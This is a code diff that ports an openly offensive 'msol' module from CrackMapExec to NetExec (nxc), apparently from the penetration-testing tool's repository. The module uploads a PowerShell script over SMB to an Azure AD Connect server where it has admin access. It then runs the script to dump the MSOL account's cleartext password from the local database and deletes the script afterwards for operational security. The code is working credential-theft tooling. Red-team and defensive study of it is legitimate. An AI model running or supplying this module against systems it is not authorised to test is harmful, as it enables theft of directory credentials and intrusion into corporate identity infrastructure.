@@ -1,12 +1,13 @@
-# MSOL module for CME
+# MSOL module for nxc
 # Author of the module : https://twitter.com/Daahtk
 # Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/
 from sys import exit
 from os import path
-from cme.helpers.powershell import get_ps_script
+from nxc.paths import TMP_PATH
+from nxc.helpers.powershell import get_ps_script
 
 
-class CMEModule:
+class NXCModule:
     name = "msol"
     description = "Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server"
     supported_protocols = ["smb"]
@@ -27,9 +28,7 @@ class CMEModule:
         self.module_options = module_options
 
     def options(self, context, module_options):
-        """
-        MSOL_PS1   // Path to the msol binary on your computer
-        """
+        """MSOL_PS1   // Path to the msol binary on your computer"""
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
         self.tmp_share = self.tmp_dir.split(":")[1]
@@ -37,7 +36,7 @@ class CMEModule:
         self.use_embedded = True
         self.msolmdl = self.cmd = ""
 
-        with open(get_ps_script("msol_dump/msol_dump.ps1"), "r") as msolsc:
+        with open(get_ps_script("msol_dump/msol_dump.ps1")) as msolsc:
             self.msol_embedded = msolsc.read()
 
         if "MSOL_PS1" in module_options:
@@ -50,9 +49,15 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         if self.use_embedded:
-            file_to_upload = "/tmp/msol.ps1"
-            with open(file_to_upload, "w") as msol:
-                msol.write(self.msol_embedded)
+            file_to_upload = f"{TMP_PATH}/msol.ps1"
+
+            try:
+                with open(file_to_upload, "w") as msol:
+                    msol.write(self.msol_embedded)
+            except FileNotFoundError:
+                context.log.fail(f"Impersonate file specified '{file_to_upload}' does not exist!")
+                exit(1)
+            
         else:
             if path.isfile(self.MSOL_PS1):
                 file_to_upload = self.MSOL_PS1
@@ -64,25 +69,25 @@ class CMEModule:
         with open(file_to_upload, "rb") as msol:
             try:
                 connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
-                context.log.success(f"Msol script successfully uploaded")
+                context.log.success("Msol script successfully uploaded")
             except Exception as e:
                 context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
                 return
         try:
             if self.cmd == "":
-                context.log.display(f"Executing the script")
+                context.log.display("Executing the script")
                 p = self.exec_script(context, connection)
                 for line in p.splitlines():
                     p1, p2 = line.split(" ", 1)
                     context.log.highlight(f"{p1} {p2}")
             else:
-                context.log.fail(f"Script Execution Impossible")
+                context.log.fail("Script Execution Impossible")
 
         except Exception as e:
             context.log.fail(f"Error running command: {e}")
         finally:
             try:
                 connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.msol}")
-                context.log.success(f"Msol script successfully deleted")
+                context.log.success("Msol script successfully deleted")
             except Exception as e:
                 context.log.fail(f"[OPSEC] Error deleting msol script on {self.share}: {e}")
